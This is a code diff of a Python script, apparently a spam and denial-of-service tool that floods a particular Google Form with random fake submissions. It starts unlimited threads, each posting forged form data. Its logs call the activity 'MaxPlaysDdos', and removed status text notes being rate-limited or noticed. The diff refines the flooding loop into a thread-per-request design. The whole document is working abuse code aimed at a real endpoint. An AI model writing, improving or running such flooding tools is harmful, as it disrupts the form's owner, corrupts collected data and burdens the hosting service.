@@ -51,37 +51,37 @@ f = open('molitva.txt', 'r', encoding='utf-8').readlines()
 for i in f:
     molitva += i
 
-def raid(a, b, c):
-    i = -1
-    while True:
-        out = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSc9CFL6d7qKMJUzKl-FUGWONREe6y9PygPzDIVkeDSyU4-bpg/formResponse",
-                            data={
-                                "entry.1508740013": a,
-                                "entry.297670832": b,
-                                "entry.347858582": c,
-                                "entry.347858582_sentinel": "",
-                                "fvv": "1",
-                                "draftResponse": '[null,null,"225161449973291891"]',
-                                "pageHistory": "0",
-                                "fbzx": "225161449973291891"
-                            },
-                            headers=headers)
+def raid(a, b, c, vv:int):
+    out = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSc9CFL6d7qKMJUzKl-FUGWONREe6y9PygPzDIVkeDSyU4-bpg/formResponse",
+                        data={
+                            "entry.1508740013": a,
+                            "entry.297670832": b,
+                            "entry.347858582": c,
+                            "entry.347858582_sentinel": "",
+                            "fvv": "1",
+                            "draftResponse": '[null,null,"225161449973291891"]',
+                            "pageHistory": "0",
+                            "fbzx": "225161449973291891"
+                        },
+                        headers=headers)
 
-        if out.status_code == 200:
-            status = "OK"
-        elif out.status_code == 429:
-            status = "TooManyRequests (хватит на сегодня)"
-        elif out.status_code == 405:
-            status = "MethodNotAllowed (Вас заметили)"
-        else:
-            status = "Undefined"
+    if out.status_code == 200:
+        status = "OK"
+    elif out.status_code == 429:
+        status = "TooManyRequests"
+    elif out.status_code == 405:
+        status = "MethodNotAllowed"
+    else:
+        status = "Undefined"
 
-        i += 1
+    
+    thr = threading.enumerate()[len(threading.enumerate()) - 1]
+    
+    LogManager.info( f"{thr} === {out} === {vv + 1} === MaxPlaysDdos === {status}" )
         
-        LogManager.info(f"{out} === {i + 1} === MaxPlaysDdos <<== ==>> {status}")
-     
 i = 0        
 while True:
-    threading.Thread(target = raid, args = (random.choice(rand_list), random.choice(genders), random.choice(da_net))).start()
+    threading.Thread(target = raid, args = (random.choice(rand_list), random.choice(genders), random.choice(da_net), i), daemon = True).start()
     # LogManager.info(f" === {i + 1} === MaxPlaysDdos ===")
+    
     i += 1
